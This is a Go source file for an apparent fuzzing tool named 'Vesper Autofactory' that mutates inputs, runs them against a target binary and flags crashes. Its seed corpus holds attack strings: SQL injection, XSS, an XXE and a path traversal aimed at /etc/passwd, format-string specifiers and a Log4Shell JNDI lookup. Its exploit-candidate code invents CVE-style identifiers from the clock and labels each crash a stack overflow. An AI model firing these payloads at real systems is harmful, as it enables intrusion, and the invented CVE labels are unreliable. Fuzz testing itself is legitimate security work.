package autofactory

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type Autofactory struct {
	config       interface{}
	targetBinary string
	fuzzDir      string
	mutations    int
	crashDir     string
	queueDir     string
	aflPath      string
	workers      int
}

type FuzzCase struct {
	ID        string
	Seed      []byte
	Mutation  []byte
	Size      int
	Score     int
	Crashes   bool
	Coverage  float64
	Timestamp int64
}

type ExploitCandidate struct {
	Title      string
	Target     string
	Payload    string
	FuzzCase   *FuzzCase
	Confidence float64
	Technique  string
}

func NewAutofactory(cfg interface{}) *Autofactory {
	aflPath := findAFL()
	return &Autofactory{
		config:  cfg,
		fuzzDir: filepath.Join(os.TempDir(), "vesper_autofactory"),
		workers: 4,
		aflPath: aflPath,
	}
}

func findAFL() string {
	paths := []string{
		"afl-fuzz", "/usr/local/bin/afl-fuzz",
		"/usr/bin/afl-fuzz", "./afl/afl-fuzz",
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
		if _, err := exec.LookPath(p); err == nil {
			return p
		}
	}
	return ""
}

func (a *Autofactory) Initialize() error {
	dirs := []string{
		a.fuzzDir,
		filepath.Join(a.fuzzDir, "queue"),
		filepath.Join(a.fuzzDir, "crashes"),
		filepath.Join(a.fuzzDir, "seeds"),
		filepath.Join(a.fuzzDir, "output"),
	}

	for _, d := range dirs {
		if err := os.MkdirAll(d, 0755); err != nil {
			return err
		}
	}

	a.crashDir = filepath.Join(a.fuzzDir, "crashes")
	a.queueDir = filepath.Join(a.fuzzDir, "queue")

	return a.generateSeedCorpus()
}

func (a *Autofactory) generateSeedCorpus() error {
	seeds := [][]byte{
		[]byte("GET / HTTP/1.1\r\nHost: target\r\n\r\n"),
		[]byte(`{"username":"admin","password":"admin"}`),
		[]byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
		[]byte("%x%x%x%x%s%s%s%n%n%n"),
		[]byte("' OR '1'='1' -- "),
		[]byte("<script>alert(1)</script>"),
		[]byte("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
		{0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF},
		[]byte("/../../../../etc/passwd"),
		[]byte("${jndi:ldap://vesper-lab.invalid:1389/exploit}"),
	}

	for i, seed := range seeds {
		path := filepath.Join(a.fuzzDir, "seeds", fmt.Sprintf("seed_%03d.bin", i))
		if err := os.WriteFile(path, seed, 0644); err != nil {
			return err
		}
	}

	return nil
}

func (a *Autofactory) Mutate(input []byte) []byte {
	mutation := make([]byte, len(input))
	copy(mutation, input)

	mutationTypes := []func([]byte) []byte{
		a.bitFlip, a.byteFlip, a.arithmeticInc,
		a.arithmeticDec, a.insertInteresting, a.deleteRandom,
		a.duplicateBytes, a.swapBytes, a.spliceData,
	}

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(mutationTypes))))
	for i := 0; i < 3; i++ {
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(mutationTypes))))
		mutation = mutationTypes[idx.Int64()](mutation)
	}

	_ = n
	return mutation
}

func (a *Autofactory) bitFlip(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	result := make([]byte, len(data))
	copy(result, data)

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(result)*8)))
	byteIdx := int(n.Int64()) / 8
	bitIdx := int(n.Int64()) % 8
	result[byteIdx] ^= (1 << bitIdx)

	return result
}

func (a *Autofactory) byteFlip(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	result := make([]byte, len(data))
	copy(result, data)

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(result))))
	result[n.Int64()] ^= 0xFF

	return result
}

func (a *Autofactory) arithmeticInc(data []byte) []byte {
	if len(data) < 4 {
		return data
	}
	result := make([]byte, len(data))
	copy(result, data)

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(result)-3)))
	pos := int(n.Int64())
	result[pos]++

	for i := 0; i < 4 && i+pos < len(result); i++ {
		result[pos+i] += 1
	}

	return result
}

func (a *Autofactory) arithmeticDec(data []byte) []byte {
	if len(data) < 4 {
		return data
	}
	result := make([]byte, len(data))
	copy(result, data)

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(result)-3)))
	pos := int(n.Int64())
	for i := 0; i < 4 && i+pos < len(result); i++ {
		result[pos+i] -= 1
	}

	return result
}

func (a *Autofactory) insertInteresting(data []byte) []byte {
	interesting := [][]byte{
		{0x00}, {0xFF}, {0x0A}, {0x0D},
		{0x25, 0x73}, {0x25, 0x6E}, {0x25, 0x78},
		{0x27, 0x20, 0x4F, 0x52},
	}

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(interesting))))
	insertData := interesting[n.Int64()]

	pos := 0
	if len(data) > 0 {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(data))))
		pos = int(n.Int64())
	}

	result := make([]byte, len(data)+len(insertData))
	copy(result, data[:pos])
	copy(result[pos:], insertData)
	copy(result[pos+len(insertData):], data[pos:])

	return result
}

func (a *Autofactory) deleteRandom(data []byte) []byte {
	if len(data) <= 1 {
		return data
	}

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(data))))
	pos := int(n.Int64())

	delLen := 1
	if pos+4 < len(data) {
		delLen = 4
	}

	result := make([]byte, len(data)-delLen)
	copy(result, data[:pos])
	copy(result[pos:], data[pos+delLen:])

	return result
}

func (a *Autofactory) duplicateBytes(data []byte) []byte {
	if len(data) <= 1 {
		return data
	}

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(data)-1)))
	pos := int(n.Int64())

	dupLen := 2
	if pos+8 < len(data) {
		dupLen = 8
	}

	result := make([]byte, len(data)+dupLen)
	copy(result, data[:pos+dupLen])
	copy(result[pos+dupLen:], data[pos:])
	copy(result[pos:], data[pos:pos+dupLen])

	return result
}

func (a *Autofactory) swapBytes(data []byte) []byte {
	if len(data) < 4 {
		return data
	}

	n1, _ := rand.Int(rand.Reader, big.NewInt(int64(len(data)-1)))
	n2, _ := rand.Int(rand.Reader, big.NewInt(int64(len(data)-1)))
	pos1 := int(n1.Int64())
	pos2 := int(n2.Int64())

	result := make([]byte, len(data))
	copy(result, data)
	result[pos1], result[pos2] = result[pos2], result[pos1]

	return result
}

func (a *Autofactory) spliceData(data []byte) []byte {
	spliceData := []byte("Vesper-SPLICE-SEGMENT-ABCDEFGHIJKLMNOPQRSTUVWXYZ")

	result := make([]byte, len(data)+len(spliceData))
	copy(result, data)
	copy(result[len(data):], spliceData)

	return result
}

func (a *Autofactory) RunFuzzer(targetCmd []string, duration time.Duration) ([]FuzzCase, error) {
	var cases []FuzzCase

	i := 0
	deadline := time.Now().Add(duration)

	for time.Now().Before(deadline) {
		i++
		seed := []byte(fmt.Sprintf("fuzz-case-%04d", i))
		mutation := a.Mutate(seed)

		result := a.testMutation(targetCmd, mutation)

		fc := FuzzCase{
			ID:        fmt.Sprintf("FC-%04d", i),
			Seed:      seed,
			Mutation:  mutation,
			Size:      len(mutation),
			Crashes:   result.Crash,
			Score:     result.Score,
			Timestamp: time.Now().Unix(),
		}
		cases = append(cases, fc)

		if result.Crash {
			crashPath := filepath.Join(a.crashDir, fmt.Sprintf("crash_%04d.bin", i))
			os.WriteFile(crashPath, mutation, 0644)
		}

		if i >= 1000 {
			break
		}
	}

	a.mutations = i
	return cases, nil
}

type fuzzResult struct {
	Crash    bool
	Score    int
	Coverage float64
	Output   string
}

func (a *Autofactory) testMutation(targetCmd []string, input []byte) fuzzResult {
	result := fuzzResult{Score: 0}

	if len(targetCmd) == 0 {
		sizeBonus := len(input) / 100
		nullCount := bytes.Count(input, []byte{0x00})
		result.Score = sizeBonus + nullCount*10
		return result
	}

	cmd := exec.Command(targetCmd[0], targetCmd[1:]...)
	cmd.Stdin = bytes.NewReader(input)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	output := stdout.String() + stderr.String()

	if err != nil {
		if _, ok := err.(*exec.ExitError); ok {
			if strings.Contains(output, "Segmentation fault") ||
				strings.Contains(output, "SIGSEGV") ||
				strings.Contains(output, "access violation") ||
				strings.Contains(output, "buffer overflow") {
				result.Crash = true
				result.Score = 1000
			}
		}
		result.Score += 100
	}

	result.Output = output

	if len(output) > 0 {
		result.Score += len(output) / 10
	}

	return result
}

func (a *Autofactory) GenerateExploitCandidates(fuzzCases []FuzzCase) []ExploitCandidate {
	var candidates []ExploitCandidate

	cveFormats := []string{
		"CVE-%d-%d",
		"MS%d-%03d",
		"ZDI-CAN-%d",
	}

	for _, fc := range fuzzCases {
		if fc.Crashes {
			cve := fmt.Sprintf(cveFormats[time.Now().UnixNano()%3],
				2020+int(time.Now().UnixNano()%6),
				1000+int(time.Now().UnixNano()%80000))

			payload := hex.EncodeToString(fc.Mutation)
			if len(payload) > 512 {
				payload = payload[:512]
			}

			candidate := ExploitCandidate{
				Title:      fmt.Sprintf("Buffer Overflow in %s", a.targetBinary),
				Target:     a.targetBinary,
				Payload:    payload,
				FuzzCase:   &fc,
				Confidence: float64(fc.Score) / 1000.0,
				Technique:  "Stack-based Buffer Overflow via " + cve,
			}
			candidates = append(candidates, candidate)
		}
	}

	return candidates
}

func (a *Autofactory) RunAFL(targetBinary string, inputDir string) error {
	if a.aflPath == "" {
		return fmt.Errorf("AFL++ not found")
	}

	os.MkdirAll(filepath.Join(a.fuzzDir, "afl_out"), 0755)

	cmd := exec.Command(a.aflPath,
		"-i", inputDir,
		"-o", filepath.Join(a.fuzzDir, "afl_out"),
		"--", targetBinary,
	)

	return cmd.Start()
}

func (a *Autofactory) FullFuzzerSuite(targetBinary string) map[string]interface{} {
	result := make(map[string]interface{})

	if err := a.Initialize(); err != nil {
		result["init_error"] = err.Error()
		return result
	}

	a.targetBinary = targetBinary
	result["fuzz_dir"] = a.fuzzDir
	result["afl_available"] = a.aflPath != ""

	targetCmd := strings.Fields(targetBinary)
	cases, err := a.RunFuzzer(targetCmd, 5*time.Second)
	if err != nil {
		result["fuzz_error"] = err.Error()
		return result
	}

	var crashCount int
	for _, fc := range cases {
		if fc.Crashes {
			crashCount++
		}
	}

	result["cases_total"] = len(cases)
	result["crashes"] = crashCount

	candidates := a.GenerateExploitCandidates(cases)
	result["exploit_candidates"] = len(candidates)
	if len(candidates) > 0 {
		result["top_candidate"] = candidates[0].Title
	}

	return result
}

func (a *Autofactory) Cleanup() {
	os.RemoveAll(a.fuzzDir)
}

var _ = bytes.NewBuffer
var _ = hex.EncodeToString
